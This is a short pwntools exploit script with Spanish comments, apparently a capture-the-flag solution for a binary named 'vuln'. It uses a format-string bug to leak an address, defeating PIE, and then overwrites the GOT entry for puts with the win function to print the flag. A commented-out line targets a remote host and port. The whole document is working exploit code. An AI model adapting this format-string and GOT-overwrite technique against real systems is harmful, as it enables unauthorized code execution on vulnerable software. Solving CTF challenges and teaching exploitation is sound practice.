from pwn import *
elf = context.binary = ELF("./vuln")
io = process("./vuln")
#io = remote("74.207.229.59","20221")
#gdb.attach(io,gdbscript="""
#           break *main+186
#           """)

# Conseguir la direccion base del binario
io.recvuntil(b"Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice")
io.sendline(b'%25$p')
io.recvline()
leak = int(io.recvline().strip(),16)
main_offset = 0x000011b3 
elf.address = leak - main_offset

# Sobreescribir la direccion de puts en .got.plt
payload = fmtstr_payload(6, {elf.got.puts:elf.sym.win},write_size='short') # Automatico
io.sendline(payload)
io.recvuntil(b"how did you do it??????????")
success(f"flag.txt: {io.recvline().decode()}")
